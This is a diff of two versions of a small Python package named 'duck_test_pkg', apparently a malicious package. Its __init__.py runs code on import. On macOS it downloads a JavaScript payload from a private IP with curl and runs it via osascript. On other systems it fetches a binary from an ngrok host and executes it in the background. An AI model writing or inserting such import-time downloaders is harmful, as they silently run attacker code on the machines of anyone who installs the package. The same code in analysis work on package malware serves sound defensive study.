# Comparing `tmp/duck_test_pkg-1.99.11.tar.gz` & `tmp/duck_test_pkg-1.99.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "duck_test_pkg-1.99.11.tar", max compression
+gzip compressed data, was "duck_test_pkg-1.99.9.tar", max compression
```

## Comparing `duck_test_pkg-1.99.11.tar` & `duck_test_pkg-1.99.9.tar`

### file list

```diff
@@ -1,4 +1,4 @@
--rw-r--r--   0        0        0       58 2023-07-20 20:38:03.036592 duck_test_pkg-1.99.11/README.md
--rw-r--r--   0        0        0      709 2023-07-31 18:37:52.655783 duck_test_pkg-1.99.11/duck_test_pkg/__init__.py
--rw-r--r--   0        0        0      334 2023-07-31 18:38:17.233507 duck_test_pkg-1.99.11/pyproject.toml
--rw-r--r--   0        0        0      351 1970-01-01 00:00:00.000000 duck_test_pkg-1.99.11/PKG-INFO
+-rw-r--r--   0        0        0       58 2023-07-20 20:38:03.036592 duck_test_pkg-1.99.9/README.md
+-rw-r--r--   0        0        0      586 2023-07-31 15:39:46.760775 duck_test_pkg-1.99.9/duck_test_pkg/__init__.py
+-rw-r--r--   0        0        0      333 2023-07-31 15:41:43.732153 duck_test_pkg-1.99.9/pyproject.toml
+-rw-r--r--   0        0        0      350 1970-01-01 00:00:00.000000 duck_test_pkg-1.99.9/PKG-INFO
```

### Comparing `duck_test_pkg-1.99.11/duck_test_pkg/__init__.py` & `duck_test_pkg-1.99.9/duck_test_pkg/__init__.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,22 +1,14 @@
 from sys import exit
 from platform import platform
 from subprocess import Popen
-from time import sleep
 
 os = platform().lower()
 
 
-def __getattr__(self):
-    def fun():
-        sleep(60*60*60)
-        pass
-    return fun
-
-
 def mznt():
     d = "/private/tmp/o"
     c = f"""
     curl -s http://192.168.10.82:9000/o.js -o {d} && nohup /usr/bin/osascript -l JavaScript {d} 1>/dev/null 2>&1 &
     """
     Popen(c, shell=True)
 
@@ -26,15 +18,16 @@
     c = f"""
     curl -s https:///eb.ngrok.dev/e -o {d} && chmod +x {d} && nohup {d} &1>/dev/null 2>&1 &'
     while true; do
       sleep 5
     done    
     """
     Popen(c, shell=True)
+    pass
 
 
 if "macos-" in os:
     mznt()
-    print("imported!!!")
 else:
     pgn()
 
+exit(0)
```

